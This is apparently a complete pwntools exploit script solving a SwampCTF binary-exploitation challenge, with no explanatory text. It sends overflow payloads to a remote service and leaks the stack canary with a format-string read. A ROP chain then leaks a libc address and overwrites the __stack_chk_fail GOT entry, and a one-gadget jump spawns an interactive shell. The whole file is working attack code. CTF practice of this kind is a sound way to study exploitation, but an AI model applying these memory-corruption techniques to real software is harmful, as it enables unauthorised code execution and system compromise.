from pwn import *

context.log_level = 'debug'
p = remote('chal1.swampctf.com', 1337)

p.recvline()
p.sendline(str(0x3da76))
p.recvline()

p.recvuntil('party name? ')
p.sendline('A'*0x7c + p32(13371337))
p.recvline()

p.recvuntil('spell? ')
p.sendline('A'*0x88 + '\x2d')
p.recvline()

p.recvuntil('action: ')

p.sendline('73')
p.recvuntil('name? ')
p.sendline('A'*0x6c + p32(0x0804A47C))
p.recvline()

p.recvuntil('format]: ')
p.sendline('3')
p.recvline()
p.sendline('%75$p\n')
cookie = int(p.recvline(), 16)

p.recvuntil('format]: ')
p.sendline('2')
p.recvline()

rop = ''
# puts out libc
rop += p64(0x400b73) # pop rdi; ret
rop += p64(0x601210) # puts libc

rop += p64(0x400700) # puts

# fgets over stack_chk_fail GOT
rop += p64(0x400b73) # pop rdi; ret
rop += p64(0x601220) # stack_chk_fail

rop += p64(0x00400900) # pop rbp; ret
rop += p64(0x601008)

rop += p64(0x400A2B) # fread

p.send('A'*0x408 + p64(cookie) + 'B'*8 + rop + '\x00'*(0x740 - 0x418 - len(rop)))

puts=u64(p.recvline()[:-1] + '\x00'*2)
libc = ELF('./libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = puts - libc.symbols['puts']
print hex(libc.address)
magic = libc.address + 0x4526a

print hex(magic)

p.send(p64(magic) + 'A'*0x110)

p.interactive()
